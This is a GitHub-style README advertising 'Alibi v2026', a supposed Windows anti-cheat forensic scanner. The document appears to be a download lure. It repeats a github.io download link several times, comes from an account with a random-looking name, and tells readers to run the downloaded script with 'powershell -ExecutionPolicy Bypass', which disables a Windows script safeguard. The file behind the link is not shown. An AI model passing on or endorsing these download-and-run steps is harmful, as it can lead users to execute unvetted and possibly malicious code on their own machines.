# Alibi v2026 - Windows forensic anti-cheat scanner

> **Alibi is a portable Windows forensic scanner for anti-cheat investigations, built to produce read-only evidence reports from a single run in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-carterrwup3261/alibi-v2026-windows-scanner?style=flat-square)](https://github.com/jason-carterrwup3261/alibi-v2026-windows-scanner)

---

<p align="center">
  <a href="https://jason-carterrwup3261.github.io/alibi-v2026-windows-scanner/">
    <img src="https://img.shields.io/badge/Download-Alibi%20Latest-brightgreen?style=for-the-badge" alt="Download Alibi">
  </a>
</p>

> **[Direct Download - Alibi v2026](https://jason-carterrwup3261.github.io/alibi-v2026-windows-scanner/)**

---

[Download Latest Build](https://jason-carterrwup3261.github.io/alibi-v2026-windows-scanner/)

---

## What Alibi Does

Alibi is a Windows-oriented forensic tool for anti-cheat review and threat-hunting tasks. It inspects the target system in read-only mode, gathers relevant artifacts, and emits desktop-based reports from a single run, without leaving behind persistent components or altering the machine during collection.

It is intended for analysts, incident responders, and players checking a disputed setup who need structured evidence around cheats, DMA-related signals, HWID spoofers, capture-card software, and input-adapter tools. Because it is portable, it fits field validation, DFIR work, and security assessments on gaming PCs or console rigs.

---

## Capabilities

- Read-only Windows scan with no install step
- Portable, no-install operation for quick field use
- Generates desktop reports after each scan
- Produces both text and HTML output
- Supports PC and console-rig detection modes
- Looks for cheats, DMA artifacts, and BYOVD-related indicators
- Identifies HWID spoofers, capture-card software, and input adapters
- Works offline, with an optional permission-based driver-safety lookup

---

## Installation

1. Download the latest build from the project page.
2. Extract the archive to a folder on your Windows machine.
3. Run the PowerShell entry point from the extracted directory.

Example launch:

`powershell -ExecutionPolicy Bypass -File .\Alibi.ps1`

If you prefer a manual workflow, you can also copy the folder to a portable drive and run it directly from there.

---

## Using Alibi

Launch Alibi from either an elevated or standard PowerShell session, based on your environment and the artifacts you need to examine.

Typical workflow:

1. Choose the scan mode that matches the target system:
   - PC inspection
   - Console-rig inspection
2. Run the scan script.
3. Review the report files written to the Desktop.
4. Open the HTML report for a visual summary or the text report for raw details.

Example:

`powershell -ExecutionPolicy Bypass -File .\Alibi.ps1 -Mode PC`

For offline investigations, keep the system disconnected and run the scan locally. If you want driver-safety context, enable the permission-based lookup during the run.

---

## Configuration

Alibi keeps configuration light and focuses on scan-time controls rather than a broad settings framework. In practice, behavior is driven by PowerShell parameters and the scan mode you choose.

Typical options include:

- Target mode: `PC` or `ConsoleRig`
- Report format: text, HTML, or both
- Driver-safety lookup: optional and permission-based
- Output location: Desktop-generated report files

Example parameter style:

`powershell -ExecutionPolicy Bypass -File .\Alibi.ps1 -Mode PC -Report Html`

---

## Requirements

- Windows operating system
- PowerShell support
- Sufficient local permissions to inspect the target machine
- Desktop write access for report generation
- Internet access is not required for core scanning
- Optional connectivity only if you enable the driver-safety lookup

---

## FAQ

**Does Alibi install anything?**  
No. It is built for portable use and read-only scanning.

**Where are the results saved?**  
The reports are written to the Desktop.

**Can it run without internet access?**  
Yes. Core scanning works offline. Network access is only relevant for the optional driver-safety lookup.

**What kinds of artifacts does it look for?**  
It focuses on anti-cheat and threat-hunting indicators such as cheats, DMA traces, BYOVD-related drivers, HWID spoofers, capture-card software, and input adapters.

**What if I need to tweak the workflow?**  
Use the PowerShell parameters and scan mode options. That is the main configuration surface.

**Who should use it?**  
It is aimed at forensic review, DFIR, security analysis, and gaming-system investigation where a read-only scan and structured reporting are useful.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
